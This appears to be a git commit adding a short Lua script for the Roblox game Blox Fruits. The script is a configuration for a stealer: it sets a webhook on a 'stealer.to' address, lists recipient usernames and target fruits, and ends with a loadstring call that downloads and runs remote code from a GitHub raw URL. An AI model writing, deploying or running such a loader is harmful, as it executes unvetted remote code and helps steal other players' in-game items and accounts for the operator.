3bfc4726cc08a97f4fc1e8b8ffa3ac3422c9c710
redzop <aiengineer2468@gmail.com>
2025-04-28 21:17:02 +0530

    Create redzop.lua

---
+++ redzop.lua
@@ -0,0 +1,5 @@
+Webhook = "https://stealer.to/post?uniqueid=a7395b6f" -- << Your Webhook
+Usernames = {"iblame_indra", "iblame_chic0"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
